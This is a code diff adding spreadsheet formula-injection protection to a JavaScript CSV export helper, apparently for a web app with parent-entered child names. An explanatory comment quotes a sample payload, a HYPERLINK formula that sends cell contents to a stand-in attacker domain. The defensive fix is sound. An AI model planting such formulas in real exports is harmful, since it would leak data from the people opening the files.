@@ -157,8 +157,16 @@ document.addEventListener('DOMContentLoaded', async () => {
 // ============================================================
 // HELPERS
 // ============================================================
+// CSV field encoder. Handles two separate concerns:
+//   1. RFC 4180 quoting for delimiters, quotes and newlines.
+//   2. Spreadsheet formula injection (R17). Excel, Sheets and Numbers execute a
+//      cell that begins with = + - or @, so a parent-supplied child name of
+//      `=HYPERLINK("https://evil.tld?"&A1)` would fire when an admin opens an
+//      export. Prefixing an apostrophe forces the cell to be read as text; the
+//      apostrophe is not displayed by the spreadsheet.
 function csvCell(val) {
-    const str = String(val ?? '');
+    let str = String(val ?? '');
+    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
     return str.includes(',') || str.includes('"') || str.includes('\n')
         ? `"${str.replace(/"/g, '""')}"` : str;
 }
